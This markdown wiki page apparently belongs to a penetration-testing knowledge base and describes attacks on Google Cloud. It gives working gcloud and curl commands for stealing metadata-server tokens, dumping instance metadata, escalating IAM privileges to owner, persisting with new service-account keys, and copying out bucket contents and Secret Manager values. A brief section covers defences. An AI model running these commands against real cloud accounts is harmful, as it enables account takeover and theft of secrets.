---
title: "GCP Attacks"
type: technique
tags: [cloud, gcp, iam, service-account, metadata, privesc, exploitation]
phase: exploitation
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
---

## What it is

Attacking Google Cloud Platform: stealing and abusing service-account credentials, metadata-server token theft, IAM privilege escalation, and looting GCS/Secret Manager. Fills the GCP gap alongside [[aws-attacks]] and [[cloud-iam-attacks]].

## How it works

GCP identity is service-account-centric. Tokens are short-lived OAuth bearer tokens minted by the metadata server or `gcloud`. Most escalation is `iam.serviceAccounts.actAs` / token-generation chains: pivot from a low-priv identity to a higher-priv service account.

## Attack phases
Exploitation / post-exploitation (after foothold, SSRF, or leaked SA key).

## Prerequisites
- A credential: SA key JSON (`"type":"service_account"`), an OAuth token, `gcloud` session, or app-side SSRF to the metadata server.

## Methodology

### 1. Identify
```bash
gcloud auth list; gcloud config list; gcloud projects list
gcloud auth activate-service-account --key-file=sa.json    # if you have a key
```

### 2. Metadata server (SSRF or on-instance)
```bash
# Header is mandatory
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
# Recursive dump (project SSH keys, attributes)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text"
```
The token is the instance's service-account OAuth token -> use as `Authorization: Bearer`.

### 3. Enumerate permissions
```bash
gcloud projects get-iam-policy <proj> --format=json
# What can THIS identity do? (test without listing rights)
gcloud iam roles describe <role>
# automated:
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation; ./gcp_enum...
scoutsuite gcp --service-account sa.json
```

### 4. IAM privilege escalation (common chains)
- `iam.serviceAccounts.actAs` + `compute.instances.create` -> launch a VM as a higher-priv SA, read its token.
- `iam.serviceAccounts.getAccessToken` / `getOpenIdToken` -> mint a token for a privileged SA directly.
- `iam.serviceAccountKeys.create` -> persist by creating a new key for a target SA.
- `cloudfunctions.functions.create` + actAs / `deploymentmanager` / `cloudbuild` -> run code as the build/function SA (often Editor).
- `setIamPolicy` on a project/SA -> grant yourself `roles/owner`.

### 5. Loot
```bash
gsutil ls; gsutil cp -r gs://<bucket> .                  # GCS objects
gcloud secrets versions access latest --secret=<name>    # Secret Manager
gcloud compute instances list; gcloud sql instances list
```

## Bypasses and variants
- Org policy may block external keys; pivot via token generation instead of key creation.
- OS Login vs metadata SSH keys: add an SSH key to project/instance metadata for shell.
- Workload Identity (GKE): pod -> node SA -> metadata token; combine with [[kubernetes-attacks]].

## Detection and defence
Least-privilege SAs (no project Editor by default), disable SA key creation (org policy), restrict metadata via Workload Identity, Cloud Audit Logs alerting on `actAs`/`setIamPolicy`, VPC-SC around storage/secrets.

## Tools
`gcloud`, `gsutil`, ScoutSuite, GCP-IAM-Privilege-Escalation (Rhino), `enumerate-iam`-style scripts. SSRF entry -> [[wiki/payloads/ssrf]], payload [[imds-cloud-metadata]]. Drive with the `hunt-cloud` skill.

## Sources
